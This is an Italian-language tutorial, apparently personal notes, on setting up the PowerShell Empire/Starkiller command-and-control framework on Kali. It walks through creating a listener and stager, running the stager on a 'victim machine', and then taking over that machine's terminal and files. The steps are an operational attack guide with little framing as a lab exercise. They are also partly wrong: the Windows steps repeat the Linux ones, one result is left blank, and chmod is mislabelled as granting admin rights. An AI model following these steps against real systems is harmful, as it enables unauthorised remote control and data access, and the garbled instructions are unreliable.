Dalla macchina Kali lancia il comando 
```bash
sudo apt install -y powershell-empire starkiller
```
Una volta installato lancia da un terminale con i permessi di root
```bash
┌──(root㉿kali)-[~]
└─# powershell-empire server    
```
Apri il tuo brawser e accedi al sito "http://0.0.0.0:1337".  
Le credenziali di accesso di Default sono Username: empireadmin e Password: password123  
Vai alla voce Linsterers e poi "CREATE"  
- ti verrà chiesto il Type e mette http
- controlla che le informazioni inserite di default siano giuste e poi schiaccia "SUBMIT"
  
Vai alla voce STAGERS e poi "CREATE"  
- ti verrà chiesto il Type e metti
   -  se si vuole attaccare una macchina Linux = Linux_bash 
   -  se si vuole attaccare una macchina Windows = Linux_bash
- mette come listener http   
- controlla che le informazioni inserite di default siano giuste e poi schiaccia "SUBMIT"
- scarica lo Stagers creato e dagli i permessi amministratore 
```bash
sudo chmod +x NOMEFILE.sh o NOMEFILE.exe 
ls -l             
total 4
-rwxrwxr-x 1 kali kali 1536 Nov 14 15:04 NOMEFILE.sh o NOMEFILE.exe
```
Trasferisci il file alla Macchina Vittima  
Apti un terminale nella direcroty dove hai salvato il file e lancia il comando  
Se su Ubunutu
```bash
sudo sh ./launcher.sh
```
Se su Windows
```bash
sudo sh ./launcher.sh
```
Ora, se tutto è andato bene, 
- su Ubuntu dovrebbe scomparire dalla cartella il file launcher.sh.
- da Windows    

Da Kali vai alla voce AGENTS e se l'attacco è andato bene dovrebbe esserci la voce con le informazioni del Computer della Vittima.  
Se cliccate sopra sarà possibile interagire con il terminale della macchina o Visionare i file di sistema del computer.  
Se andate nella Sezione FILE BROWSER è possibile cliccando col tasto destro nella cartella desiderata effettuare un upload di file.
